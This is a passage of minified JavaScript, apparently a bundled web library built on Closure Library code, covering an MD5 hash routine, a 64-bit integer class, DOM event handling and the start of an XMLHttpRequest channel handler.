4967295,K=N+(T<<9&4294967295|T>>>23),T=W+(N^B&(K^N))+z[11]+643717713&4294967295,W=K+(T<<14&4294967295|T>>>18),T=B+(K^N&(W^K))+z[0]+3921069994&4294967295,B=W+(T<<20&4294967295|T>>>12),T=N+(W^K&(B^W))+z[5]+3593408605&4294967295,N=B+(T<<5&4294967295|T>>>27),T=K+(B^W&(N^B))+z[10]+38016083&4294967295,K=N+(T<<9&4294967295|T>>>23),T=W+(N^B&(K^N))+z[15]+3634488961&4294967295,W=K+(T<<14&4294967295|T>>>18),T=B+(K^N&(W^K))+z[4]+3889429448&4294967295,B=W+(T<<20&4294967295|T>>>12),T=N+(W^K&(B^W))+z[9]+568446438&4294967295,N=B+(T<<5&4294967295|T>>>27),T=K+(B^W&(N^B))+z[14]+3275163606&4294967295,K=N+(T<<9&4294967295|T>>>23),T=W+(N^B&(K^N))+z[3]+4107603335&4294967295,W=K+(T<<14&4294967295|T>>>18),T=B+(K^N&(W^K))+z[8]+1163531501&4294967295,B=W+(T<<20&4294967295|T>>>12),T=N+(W^K&(B^W))+z[13]+2850285829&4294967295,N=B+(T<<5&4294967295|T>>>27),T=K+(B^W&(N^B))+z[2]+4243563512&4294967295,K=N+(T<<9&4294967295|T>>>23),T=W+(N^B&(K^N))+z[7]+1735328473&4294967295,W=K+(T<<14&4294967295|T>>>18),T=B+(K^N&(W^K))+z[12]+2368359562&4294967295,B=W+(T<<20&4294967295|T>>>12),T=N+(B^W^K)+z[5]+4294588738&4294967295,N=B+(T<<4&4294967295|T>>>28),T=K+(N^B^W)+z[8]+2272392833&4294967295,K=N+(T<<11&4294967295|T>>>21),T=W+(K^N^B)+z[11]+1839030562&4294967295,W=K+(T<<16&4294967295|T>>>16),T=B+(W^K^N)+z[14]+4259657740&4294967295,B=W+(T<<23&4294967295|T>>>9),T=N+(B^W^K)+z[1]+2763975236&4294967295,N=B+(T<<4&4294967295|T>>>28),T=K+(N^B^W)+z[4]+1272893353&4294967295,K=N+(T<<11&4294967295|T>>>21),T=W+(K^N^B)+z[7]+4139469664&4294967295,W=K+(T<<16&4294967295|T>>>16),T=B+(W^K^N)+z[10]+3200236656&4294967295,B=W+(T<<23&4294967295|T>>>9),T=N+(B^W^K)+z[13]+681279174&4294967295,N=B+(T<<4&4294967295|T>>>28),T=K+(N^B^W)+z[0]+3936430074&4294967295,K=N+(T<<11&4294967295|T>>>21),T=W+(K^N^B)+z[3]+3572445317&4294967295,W=K+(T<<16&4294967295|T>>>16),T=B+(W^K^N)+z[6]+76029189&4294967295,B=W+(T<<23&4294967295|T>>>9),T=N+(B^W^K)+z[9]+3654602809&4294967295,N=B+(T<<4&4294967295|T>>>28),T=K+(N^B^W)+z[12]+3873151461&4294967295,K=N+(T<<11&4294967295|T>>>21),T=W+(K^N^B)+z[15]+530742520&4294967295,W=K+(T<<16&4294967295|T>>>16),T=B+(W^K^N)+z[2]+3299628645&4294967295,B=W+(T<<23&4294967295|T>>>9),T=N+(W^(B|~K))+z[0]+4096336452&4294967295,N=B+(T<<6&4294967295|T>>>26),T=K+(B^(N|~W))+z[7]+1126891415&4294967295,K=N+(T<<10&4294967295|T>>>22),T=W+(N^(K|~B))+z[14]+2878612391&4294967295,W=K+(T<<15&4294967295|T>>>17),T=B+(K^(W|~N))+z[5]+4237533241&4294967295,B=W+(T<<21&4294967295|T>>>11),T=N+(W^(B|~K))+z[12]+1700485571&4294967295,N=B+(T<<6&4294967295|T>>>26),T=K+(B^(N|~W))+z[3]+2399980690&4294967295,K=N+(T<<10&4294967295|T>>>22),T=W+(N^(K|~B))+z[10]+4293915773&4294967295,W=K+(T<<15&4294967295|T>>>17),T=B+(K^(W|~N))+z[1]+2240044497&4294967295,B=W+(T<<21&4294967295|T>>>11),T=N+(W^(B|~K))+z[8]+1873313359&4294967295,N=B+(T<<6&4294967295|T>>>26),T=K+(B^(N|~W))+z[15]+4264355552&4294967295,K=N+(T<<10&4294967295|T>>>22),T=W+(N^(K|~B))+z[6]+2734768916&4294967295,W=K+(T<<15&4294967295|T>>>17),T=B+(K^(W|~N))+z[13]+1309151649&4294967295,B=W+(T<<21&4294967295|T>>>11),T=N+(W^(B|~K))+z[4]+4149444226&4294967295,N=B+(T<<6&4294967295|T>>>26),T=K+(B^(N|~W))+z[11]+3174756917&4294967295,K=N+(T<<10&4294967295|T>>>22),T=W+(N^(K|~B))+z[2]+718787259&4294967295,W=K+(T<<15&4294967295|T>>>17),T=B+(K^(W|~N))+z[9]+3951481745&4294967295,L.g[0]=L.g[0]+N&4294967295,L.g[1]=L.g[1]+(W+(T<<21&4294967295|T>>>11))&4294967295,L.g[2]=L.g[2]+W&4294967295,L.g[3]=L.g[3]+K&4294967295}r.prototype.u=function(L,N){N===void 0&&(N=L.length);for(var B=N-this.blockSize,z=this.B,W=this.h,K=0;K<N;){if(W==0)for(;K<=B;)i(this,L,K),K+=this.blockSize;if(typeof L=="string"){for(;K<N;)if(z[W++]=L.charCodeAt(K++),W==this.blockSize){i(this,z),W=0;break}}else for(;K<N;)if(z[W++]=L[K++],W==this.blockSize){i(this,z),W=0;break}}this.h=W,this.o+=N},r.prototype.v=function(){var L=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);L[0]=128;for(var N=1;N<L.length-8;++N)L[N]=0;var B=8*this.o;for(N=L.length-8;N<L.length;++N)L[N]=B&255,B/=256;for(this.u(L),L=Array(16),N=B=0;4>N;++N)for(var z=0;32>z;z+=8)L[B++]=this.g[N]>>>z&255;return L};function s(L,N){var B=a;return Object.prototype.hasOwnProperty.call(B,L)?B[L]:B[L]=N(L)}function o(L,N){this.h=N;for(var B=[],z=!0,W=L.length-1;0<=W;W--){var K=L[W]|0;z&&K==N||(B[W]=K,z=!1)}this.g=B}var a={};function l(L){return-128<=L&&128>L?s(L,function(N){return new o([N|0],0>N?-1:0)}):new o([L|0],0>L?-1:0)}function u(L){if(isNaN(L)||!isFinite(L))return f;if(0>L)return I(u(-L));for(var N=[],B=1,z=0;L>=B;z++)N[z]=L/B|0,B*=4294967296;return new o(N,0)}function h(L,N){if(L.length==0)throw Error("number format error: empty string");if(N=N||10,2>N||36<N)throw Error("radix out of range: "+N);if(L.charAt(0)=="-")return I(h(L.substring(1),N));if(0<=L.indexOf("-"))throw Error('number format error: interior "-" character');for(var B=u(Math.pow(N,8)),z=f,W=0;W<L.length;W+=8){var K=Math.min(8,L.length-W),T=parseInt(L.substring(W,W+K),N);8>K?(K=u(Math.pow(N,K)),z=z.j(K).add(u(T))):(z=z.j(B),z=z.add(u(T)))}return z}var f=l(0),m=l(1),v=l(16777216);n=o.prototype,n.m=function(){if(k(this))return-I(this).m();for(var L=0,N=1,B=0;B<this.g.length;B++){var z=this.i(B);L+=(0<=z?z:4294967296+z)*N,N*=4294967296}return L},n.toString=function(L){if(L=L||10,2>L||36<L)throw Error("radix out of range: "+L);if(x(this))return"0";if(k(this))return"-"+I(this).toString(L);for(var N=u(Math.pow(L,6)),B=this,z="";;){var W=U(B,N).g;B=S(B,W.j(N));var K=((0<B.g.length?B.g[0]:B.h)>>>0).toString(L);if(B=W,x(B))return K+z;for(;6>K.length;)K="0"+K;z=K+z}},n.i=function(L){return 0>L?0:L<this.g.length?this.g[L]:this.h};function x(L){if(L.h!=0)return!1;for(var N=0;N<L.g.length;N++)if(L.g[N]!=0)return!1;return!0}function k(L){return L.h==-1}n.l=function(L){return L=S(this,L),k(L)?-1:x(L)?0:1};function I(L){for(var N=L.g.length,B=[],z=0;z<N;z++)B[z]=~L.g[z];return new o(B,~L.h).add(m)}n.abs=function(){return k(this)?I(this):this},n.add=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0,W=0;W<=N;W++){var K=z+(this.i(W)&65535)+(L.i(W)&65535),T=(K>>>16)+(this.i(W)>>>16)+(L.i(W)>>>16);z=T>>>16,K&=65535,T&=65535,B[W]=T<<16|K}return new o(B,B[B.length-1]&-2147483648?-1:0)};function S(L,N){return L.add(I(N))}n.j=function(L){if(x(this)||x(L))return f;if(k(this))return k(L)?I(this).j(I(L)):I(I(this).j(L));if(k(L))return I(this.j(I(L)));if(0>this.l(v)&&0>L.l(v))return u(this.m()*L.m());for(var N=this.g.length+L.g.length,B=[],z=0;z<2*N;z++)B[z]=0;for(z=0;z<this.g.length;z++)for(var W=0;W<L.g.length;W++){var K=this.i(z)>>>16,T=this.i(z)&65535,d=L.i(W)>>>16,_=L.i(W)&65535;B[2*z+2*W]+=T*_,b(B,2*z+2*W),B[2*z+2*W+1]+=K*_,b(B,2*z+2*W+1),B[2*z+2*W+1]+=T*d,b(B,2*z+2*W+1),B[2*z+2*W+2]+=K*d,b(B,2*z+2*W+2)}for(z=0;z<N;z++)B[z]=B[2*z+1]<<16|B[2*z];for(z=N;z<2*N;z++)B[z]=0;return new o(B,0)};function b(L,N){for(;(L[N]&65535)!=L[N];)L[N+1]+=L[N]>>>16,L[N]&=65535,N++}function E(L,N){this.g=L,this.h=N}function U(L,N){if(x(N))throw Error("division by zero");if(x(L))return new E(f,f);if(k(L))return N=U(I(L),N),new E(I(N.g),I(N.h));if(k(N))return N=U(L,I(N)),new E(I(N.g),N.h);if(30<L.g.length){if(k(L)||k(N))throw Error("slowDivide_ only works with positive integers.");for(var B=m,z=N;0>=z.l(L);)B=H(B),z=H(z);var W=q(B,1),K=q(z,1);for(z=q(z,2),B=q(B,2);!x(z);){var T=K.add(z);0>=T.l(L)&&(W=W.add(B),K=T),z=q(z,1),B=q(B,1)}return N=S(L,W.j(N)),new E(W,N)}for(W=f;0<=L.l(N);){for(B=Math.max(1,Math.floor(L.m()/N.m())),z=Math.ceil(Math.log(B)/Math.LN2),z=48>=z?1:Math.pow(2,z-48),K=u(B),T=K.j(N);k(T)||0<T.l(L);)B-=z,K=u(B),T=K.j(N);x(K)&&(K=m),W=W.add(K),L=S(L,T)}return new E(W,L)}n.A=function(L){return U(this,L).h},n.and=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0;z<N;z++)B[z]=this.i(z)&L.i(z);return new o(B,this.h&L.h)},n.or=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0;z<N;z++)B[z]=this.i(z)|L.i(z);return new o(B,this.h|L.h)},n.xor=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0;z<N;z++)B[z]=this.i(z)^L.i(z);return new o(B,this.h^L.h)};function H(L){for(var N=L.g.length+1,B=[],z=0;z<N;z++)B[z]=L.i(z)<<1|L.i(z-1)>>>31;return new o(B,L.h)}function q(L,N){var B=N>>5;N%=32;for(var z=L.g.length-B,W=[],K=0;K<z;K++)W[K]=0<N?L.i(K+B)>>>N|L.i(K+B+1)<<32-N:L.i(K+B);return new o(W,L.h)}r.prototype.digest=r.prototype.v,r.prototype.reset=r.prototype.s,r.prototype.update=r.prototype.u,U2=r,o.prototype.add=o.prototype.add,o.prototype.multiply=o.prototype.j,o.prototype.modulo=o.prototype.A,o.prototype.compare=o.prototype.l,o.prototype.toNumber=o.prototype.m,o.prototype.toString=o.prototype.toString,o.prototype.getBits=o.prototype.i,o.fromNumber=u,o.fromString=h,io=o}).apply(typeof EI<"u"?EI:typeof self<"u"?self:typeof window<"u"?window:{});var af=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var j2,zc,V2,Lf,fy,F2,z2,W2;(function(){var n,e=typeof Object.defineProperties=="function"?Object.defineProperty:function(c,p,A){return c==Array.prototype||c==Object.prototype||(c[p]=A.value),c};function t(c){c=[typeof globalThis=="object"&&globalThis,c,typeof window=="object"&&window,typeof self=="object"&&self,typeof af=="object"&&af];for(var p=0;p<c.length;++p){var A=c[p];if(A&&A.Math==Math)return A}throw Error("Cannot find globalThis object")}var r=t(this);function i(c,p){if(p)e:{var A=r;c=c.split(".");for(var O=0;O<c.length-1;O++){var Q=c[O];if(!(Q in A))break e;A=A[Q]}c=c[c.length-1],O=A[c],p=p(O),p!=O&&p!=null&&e(A,c,{configurable:!0,writable:!0,value:p})}}function s(c,p){c instanceof String&&(c+="");var A=0,O=!1,Q={next:function(){if(!O&&A<c.length){var ne=A++;return{value:p(ne,c[ne]),done:!1}}return O=!0,{done:!0,value:void 0}}};return Q[Symbol.iterator]=function(){return Q},Q}i("Array.prototype.values",function(c){return c||function(){return s(this,function(p,A){return A})}});/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/var o=o||{},a=this||self;function l(c){var p=typeof c;return p=p!="object"?p:c?Array.isArray(c)?"array":p:"null",p=="array"||p=="object"&&typeof c.length=="number"}function u(c){var p=typeof c;return p=="object"&&c!=null||p=="function"}function h(c,p,A){return c.call.apply(c.bind,arguments)}function f(c,p,A){if(!c)throw Error();if(2<arguments.length){var O=Array.prototype.slice.call(arguments,2);return function(){var Q=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(Q,O),c.apply(p,Q)}}return function(){return c.apply(p,arguments)}}function m(c,p,A){return m=Function.prototype.bind&&Function.prototype.bind.toString().indexOf("native code")!=-1?h:f,m.apply(null,arguments)}function v(c,p){var A=Array.prototype.slice.call(arguments,1);return function(){var O=A.slice();return O.push.apply(O,arguments),c.apply(this,O)}}function x(c,p){function A(){}A.prototype=p.prototype,c.aa=p.prototype,c.prototype=new A,c.prototype.constructor=c,c.Qb=function(O,Q,ne){for(var fe=Array(arguments.length-2),wt=2;wt<arguments.length;wt++)fe[wt-2]=arguments[wt];return p.prototype[Q].apply(O,fe)}}function k(c){const p=c.length;if(0<p){const A=Array(p);for(let O=0;O<p;O++)A[O]=c[O];return A}return[]}function I(c,p){for(let A=1;A<arguments.length;A++){const O=arguments[A];if(l(O)){const Q=c.length||0,ne=O.length||0;c.length=Q+ne;for(let fe=0;fe<ne;fe++)c[Q+fe]=O[fe]}else c.push(O)}}class S{constructor(p,A){this.i=p,this.j=A,this.h=0,this.g=null}get(){let p;return 0<this.h?(this.h--,p=this.g,this.g=p.next,p.next=null):p=this.i(),p}}function b(c){return/^[\s\xa0]*$/.test(c)}function E(){var c=a.navigator;return c&&(c=c.userAgent)?c:""}function U(c){return U[" "](c),c}U[" "]=function(){};var H=E().indexOf("Gecko")!=-1&&!(E().toLowerCase().indexOf("webkit")!=-1&&E().indexOf("Edge")==-1)&&!(E().indexOf("Trident")!=-1||E().indexOf("MSIE")!=-1)&&E().indexOf("Edge")==-1;function q(c,p,A){for(const O in c)p.call(A,c[O],O,c)}function L(c,p){for(const A in c)p.call(void 0,c[A],A,c)}function N(c){const p={};for(const A in c)p[A]=c[A];return p}const B="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function z(c,p){let A,O;for(let Q=1;Q<arguments.length;Q++){O=arguments[Q];for(A in O)c[A]=O[A];for(let ne=0;ne<B.length;ne++)A=B[ne],Object.prototype.hasOwnProperty.call(O,A)&&(c[A]=O[A])}}function W(c){var p=1;c=c.split(":");const A=[];for(;0<p&&c.length;)A.push(c.shift()),p--;return c.length&&A.push(c.join(":")),A}function K(c){a.setTimeout(()=>{throw c},0)}function T(){var c=j;let p=null;return c.g&&(p=c.g,c.g=c.g.next,c.g||(c.h=null),p.next=null),p}class d{constructor(){this.h=this.g=null}add(p,A){const O=_.get();O.set(p,A),this.h?this.h.next=O:this.g=O,this.h=O}}var _=new S(()=>new C,c=>c.reset());class C{constructor(){this.next=this.g=this.h=null}set(p,A){this.h=p,this.g=A,this.next=null}reset(){this.next=this.g=this.h=null}}let M,R=!1,j=new d,$=()=>{const c=a.Promise.resolve(void 0);M=()=>{c.then(D)}};var D=()=>{for(var c;c=T();){try{c.h.call(c.g)}catch(A){K(A)}var p=_;p.j(c),100>p.h&&(p.h++,c.next=p.g,p.g=c)}R=!1};function y(){this.s=this.s,this.C=this.C}y.prototype.s=!1,y.prototype.ma=function(){this.s||(this.s=!0,this.N())},y.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function V(c,p){this.type=c,this.g=this.target=p,this.defaultPrevented=!1}V.prototype.h=function(){this.defaultPrevented=!0};var oe=function(){if(!a.addEventListener||!Object.defineProperty)return!1;var c=!1,p=Object.defineProperty({},"passive",{get:function(){c=!0}});try{const A=()=>{};a.addEventListener("test",A,p),a.removeEventListener("test",A,p)}catch{}return c}();function le(c,p){if(V.call(this,c?c.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,c){var A=this.type=c.type,O=c.changedTouches&&c.changedTouches.length?c.changedTouches[0]:null;if(this.target=c.target||c.srcElement,this.g=p,p=c.relatedTarget){if(H){e:{try{U(p.nodeName);var Q=!0;break e}catch{}Q=!1}Q||(p=null)}}else A=="mouseover"?p=c.fromElement:A=="mouseout"&&(p=c.toElement);this.relatedTarget=p,O?(this.clientX=O.clientX!==void 0?O.clientX:O.pageX,this.clientY=O.clientY!==void 0?O.clientY:O.pageY,this.screenX=O.screenX||0,this.screenY=O.screenY||0):(this.clientX=c.clientX!==void 0?c.clientX:c.pageX,this.clientY=c.clientY!==void 0?c.clientY:c.pageY,this.screenX=c.screenX||0,this.screenY=c.screenY||0),this.button=c.button,this.key=c.key||"",this.ctrlKey=c.ctrlKey,this.altKey=c.altKey,this.shiftKey=c.shiftKey,this.metaKey=c.metaKey,this.pointerId=c.pointerId||0,this.pointerType=typeof c.pointerType=="string"?c.pointerType:he[c.pointerType]||"",this.state=c.state,this.i=c,c.defaultPrevented&&le.aa.h.call(this)}}x(le,V);var he={2:"touch",3:"pen",4:"mouse"};le.prototype.h=function(){le.aa.h.call(this);var c=this.i;c.preventDefault?c.preventDefault():c.returnValue=!1};var ke="closure_listenable_"+(1e6*Math.random()|0),Te=0;function Ne(c,p,A,O,Q){this.listener=c,this.proxy=null,this.src=p,this.type=A,this.capture=!!O,this.ha=Q,this.key=++Te,this.da=this.fa=!1}function gt(c){c.da=!0,c.listener=null,c.proxy=null,c.src=null,c.ha=null}function je(c){this.src=c,this.g={},this.h=0}je.prototype.add=function(c,p,A,O,Q){var ne=c.toString();c=this.g[ne],c||(c=this.g[ne]=[],this.h++);var fe=Pt(c,p,O,Q);return-1<fe?(p=c[fe],A||(p.fa=!1)):(p=new Ne(p,this.src,ne,!!O,Q),p.fa=A,c.push(p)),p};function Ue(c,p){var A=p.type;if(A in c.g){var O=c.g[A],Q=Array.prototype.indexOf.call(O,p,void 0),ne;(ne=0<=Q)&&Array.prototype.splice.call(O,Q,1),ne&&(gt(p),c.g[A].length==0&&(delete c.g[A],c.h--))}}function Pt(c,p,A,O){for(var Q=0;Q<c.length;++Q){var ne=c[Q];if(!ne.da&&ne.listener==p&&ne.capture==!!A&&ne.ha==O)return Q}return-1}var We="closure_lm_"+(1e6*Math.random()|0),Ke={};function Di(c,p,A,O,Q){if(O&&O.once)return Oi(c,p,A,O,Q);if(Array.isArray(p)){for(var ne=0;ne<p.length;ne++)Di(c,p[ne],A,O,Q);return null}return A=ut(A),c&&c[ke]?c.K(p,A,u(O)?!!O.capture:!!O,Q):ot(c,p,A,!1,O,Q)}function ot(c,p,A,O,Q,ne){if(!p)throw Error("Invalid event type");var fe=u(Q)?!!Q.capture:!!Q,wt=ct(c);if(wt||(c[We]=wt=new je(c)),A=wt.add(p,A,O,fe,ne),A.proxy)return A;if(O=vt(),A.proxy=O,O.src=c,O.listener=A,c.addEventListener)oe||(Q=fe),Q===void 0&&(Q=!1),c.addEventListener(p.toString(),O,Q);else if(c.attachEvent)c.attachEvent(on(p.toString()),O);else if(c.addListener&&c.removeListener)c.addListener(O);else throw Error("addEventListener and attachEvent are unavailable.");return A}function vt(){function c(A){return p.call(c.src,c.listener,A)}const p=lt;return c}function Oi(c,p,A,O,Q){if(Array.isArray(p)){for(var ne=0;ne<p.length;ne++)Oi(c,p[ne],A,O,Q);return null}return A=ut(A),c&&c[ke]?c.L(p,A,u(O)?!!O.capture:!!O,Q):ot(c,p,A,!0,O,Q)}function at(c,p,A,O,Q){if(Array.isArray(p))for(var ne=0;ne<p.length;ne++)at(c,p[ne],A,O,Q);else O=u(O)?!!O.capture:!!O,A=ut(A),c&&c[ke]?(c=c.i,p=String(p).toString(),p in c.g&&(ne=c.g[p],A=Pt(ne,A,O,Q),-1<A&&(gt(ne[A]),Array.prototype.splice.call(ne,A,1),ne.length==0&&(delete c.g[p],c.h--)))):c&&(c=ct(c))&&(p=c.g[p.toString()],c=-1,p&&(c=Pt(p,A,O,Q)),(A=-1<c?p[c]:null)&&Xe(A))}function Xe(c){if(typeof c!="number"&&c&&!c.da){var p=c.src;if(p&&p[ke])Ue(p.i,c);else{var A=c.type,O=c.proxy;p.removeEventListener?p.removeEventListener(A,O,c.capture):p.detachEvent?p.detachEvent(on(A),O):p.addListener&&p.removeListener&&p.removeListener(O),(A=ct(p))?(Ue(A,c),A.h==0&&(A.src=null,p[We]=null)):gt(c)}}}function on(c){return c in Ke?Ke[c]:Ke[c]="on"+c}function lt(c,p){if(c.da)c=!0;else{p=new le(p,this);var A=c.listener,O=c.ha||c.src;c.fa&&Xe(c),c=A.call(O,p)}return c}function ct(c){return c=c[We],c instanceof je?c:null}var wn="__closure_events_fn_"+(1e9*Math.random()>>>0);function ut(c){return typeof c=="function"?c:(c[wn]||(c[wn]=function(p){return c.handleEvent(p)}),c[wn])}function P(){y.call(this),this.i=new je(this),this.M=this,this.F=null}x(P,y),P.prototype[ke]=!0,P.prototype.removeEventListener=function(c,p,A,O){at(this,c,p,A,O)};function g(c,p){var A,O=c.F;if(O)for(A=[];O;O=O.F)A.push(O);if(c=c.M,O=p.type||p,typeof p=="string")p=new V(p,c);else if(p instanceof V)p.target=p.target||c;else{var Q=p;p=new V(O,c),z(p,Q)}if(Q=!0,A)for(var ne=A.length-1;0<=ne;ne--){var fe=p.g=A[ne];Q=w(fe,O,!0,p)&&Q}if(fe=p.g=c,Q=w(fe,O,!0,p)&&Q,Q=w(fe,O,!1,p)&&Q,A)for(ne=0;ne<A.length;ne++)fe=p.g=A[ne],Q=w(fe,O,!1,p)&&Q}P.prototype.N=function(){if(P.aa.N.call(this),this.i){var c=this.i,p;for(p in c.g){for(var A=c.g[p],O=0;O<A.length;O++)gt(A[O]);delete c.g[p],c.h--}}this.F=null},P.prototype.K=function(c,p,A,O){return this.i.add(String(c),p,!1,A,O)},P.prototype.L=function(c,p,A,O){return this.i.add(String(c),p,!0,A,O)};function w(c,p,A,O){if(p=c.i.g[String(p)],!p)return!0;p=p.concat();for(var Q=!0,ne=0;ne<p.length;++ne){var fe=p[ne];if(fe&&!fe.da&&fe.capture==A){var wt=fe.listener,kn=fe.ha||fe.src;fe.fa&&Ue(c.i,fe),Q=wt.call(kn,O)!==!1&&Q}}return Q&&!O.defaultPrevented}function F(c,p,A){if(typeof c=="function")A&&(c=m(c,A));else if(c&&typeof c.handleEvent=="function")c=m(c.handleEvent,c);else throw Error("Invalid listener argument");return 2147483647<Number(p)?-1:a.setTimeout(c,p||0)}function G(c){c.g=F(()=>{c.g=null,c.i&&(c.i=!1,G(c))},c.l);const p=c.h;c.h=null,c.m.apply(null,p)}class Z extends y{constructor(p,A){super(),this.m=p,this.l=A,this.h=null,this.i=!1,this.g=null}j(p){this.h=arguments,this.g?this.i=!0:G(this)}N(){super.N(),this.g&&(a.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function ee(c){y.call(this),this.h=c,this.g={}}x(ee,y);var Oe=[];function Pe(c){q(c.g,function(p,A){this.g.hasOwnProperty(A)&&Xe(p)},c),c.g={}}ee.prototype.N=function(){ee.aa.N.call(this),Pe(this)},ee.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var Ce=a.JSON.stringify,mt=a.JSON.parse,xe=class{stringify(c){return a.JSON.stringify(c,void 0)}parse(c){return a.JSON.parse(c,void 0)}};function Lt(){}Lt.prototype.h=null;function cc(c){return c.h||(c.h=c.i())}function Vt(){}var _t={OPEN:"a",kb:"b",Ja:"c",wb:"d"};function Ea(){V.call(this,"d")}x(Ea,V);function Dt(){V.call(this,"c")}x(Dt,V);var pt={},uc=null;function At(){return uc=uc||new P}pt.La="serverreachability";function Ft(c){V.call(this,pt.La,c)}x(Ft,V);function ms(c){const p=At();g(p,new Ft(p))}pt.STAT_EVENT="statevent";function zt(c,p){V.call(this,pt.STAT_EVENT,c),this.stat=p}x(zt,V);function Ge(c){const p=At();g(p,new zt(p,c))}pt.Ma="timingevent";function hc(c,p){V.call(this,pt.Ma,c),this.size=p}x(hc,V);function Et(c,p){if(typeof c!="function")throw Error("Fn must not be null and must be a function");return a.setTimeout(function(){c()},p)}function It(){this.g=!0}It.prototype.xa=function(){this.g=!1};function vh(c,p,A,O,Q,ne){c.info(function(){if(c.g)if(ne)for(var fe="",wt=ne.split("&"),kn=0;kn<wt.length;kn++){var et=wt[kn].split("=");if(1<et.length){var Fn=et[0];et=et[1];var zn=Fn.split("_");fe=2<=zn.length&&zn[1]=="type"?fe+(Fn+"="+et+"&"):fe+(Fn+"=redacted&")}}else fe=null;else fe=ne;return"XMLHTTP REQ ("+O+") [attempt "+Q+"]: "+p+`
`+A+`
`+fe})}function Yt(c,p,A,O,Q,ne,fe){c.info(function(){return"XMLHTTP RESP ("+O+") [ attempt "+Q+"]: "+p+`
`+A+`
`+ne+" "+fe})}function yt(c,p,A,O){c.info(function(){return"XMLHTTP TEXT ("+p+"): "+Zt(c,A)+(O?" "+O:"")})}function _h(c,p){c.info(function(){return"TIMEOUT: "+p})}It.prototype.info=function(){};function Zt(c,p){if(!c.g)return p;if(!p)return null;try{var A=JSON.parse(p);if(A){for(c=0;c<A.length;c++)if(Array.isArray(A[c])){var O=A[c];if(!(2>O.length)){var Q=O[1];if(Array.isArray(Q)&&!(1>Q.length)){var ne=Q[0];if(ne!="noop"&&ne!="stop"&&ne!="close")for(var fe=1;fe<Q.length;fe++)Q[fe]=""}}}}return Ce(A)}catch{return p}}var bt={NO_ERROR:0,gb:1,tb:2,sb:3,nb:4,rb:5,ub:6,Ia:7,TIMEOUT:8,xb:9},fc={lb:"complete",Hb:"success",Ja:"error",Ia:"abort",zb:"ready",Ab:"readystatechange",TIMEOUT:"timeout",vb:"incrementaldata",yb:"progress",ob:"downloadprogress",Pb:"uploadprogress"},Ot;function xt(){}x(xt,Lt),xt.prototype.g=function(){return new XMLHttpRequest},xt.prototype.i=function(){return{}},Ot=new xt;function Or(c,p,A,O){this.j=c,this.i=p,this.l=A,this.R=O||1,this.U=new ee(this),this.I=45e3,this.H=null,this.o=!1,this.m=this.A=this.v=this.L=this.F=this.S=this.B=null,this.D=[],this.g=null,this.C=0,this.s=this.u=null,this.X=-1,this.J=!1,this.O=0,this.M=null,this.W=this.K=this.T=this.P=!1,this.h=new Ia}function Ia(){this.i=null,this.g="",this.h=!1}var Sa={},Io={};function So(c,p,A){c.L=1,c.v=Sh(Ui(p)),c.m=A,c.P=!0,Ta(c,null)}function Ta(c,p){c.F=Date.now(),ys(c),c.A=Ui(c.v);var A=c.A,O=c.R;Array.isArray(O)||(O=[String(O)]),h_(A.i,"t",O),c.C=0,A=c.j.J,c.h=new Ia,c.g=C_(c.j,A?p:null,!c.m),0<c.O&&(c.M=new Z(m(c.Y,c,c.g),c.O)),p=c.U,A=c.g,O=c.ca;var Q="readystatechange";Array.isArray(Q)||(Q&&(Oe[0]=Q.toString()),Q=Oe);for(var ne=0;ne<Q.length;ne++){var fe=Di(A,Q[ne],O||p.handleEvent,!1,p.h||p);if(!fe)break;p.g[fe.key]=fe}p=c.H?N(c.H):{},c.m?(c.u||(c.u="POST"),p["Content-Type"]="application/x-www-form-urlencoded",c.g.ea(c.A,c.u,c.m,p)):(c.u="GET",c.g.ea(c.A,c.u,null,p)),ms(),vh(c.i,c.u,c.A,c.l,c.R,c.m)}Or.prototype.ca=function(c){c=c.target;const p=this.M;p&&ji(c)==3?p.j():this.Y(c)},Or.prototype.Y=function(c){try{if(c==this.g)e:{const zn=ji(this.g);var p=this.g.Ba();const Na=this.g.Z();if(!(3>zn)&&(zn!=3||this.g&&(this.h.h||this.g.oa()||w_(this.g)))){this.J||zn!=4||p==7||(p==8||0>=Na?ms(3):ms(2)),To(this);var A=this.g.Z();this.X=A;t:if(Aa(this)){var O=w_(this.g);c="";var Q=O.length,ne=ji(this.g)==4;if(!this.h.i){if(typeof TextDecoder>"u"){Qr(this),Bi(this);var fe="";break t}this.h.i=new a.TextDecoder}for(p=0;p<Q;p++)this.h.h=!0,c+=this.h.i.decode(O[p],{stream:!(ne&&p==Q-1)});O.length=0,this.h.g+=c,this.C=0,fe=this.h.g}else fe=this.g.oa();if(this.o=A==200,Yt(this.i,this.u,this.A,this.l,this.R,zn,A),this.o){if(this.T&&!this.K){t:{if(this.g){var wt,kn=this.g;if((wt=kn.g?kn.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!b(wt)){var et=wt;break t}}et=null}if(A=et)yt(this.i,this.l,A,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,Ao(this,A);else{this.o=!1,this.s=3,Ge(12),Qr(this),Bi(this);break e}}if(this.P){A=!0;let Yr;for(;!this.J&&this.C<fe.length;)if(Yr=dc(this,fe),Yr==Io){zn==4&&(this.s=4,Ge(14),A=!1),yt(this.i,this.l,null,"[Incomplete Response]");break}else if(Yr==Sa){this.s=4,Ge(15),yt(this.i,this.l,fe,"[Invalid Chunk]"),A=!1;break}else 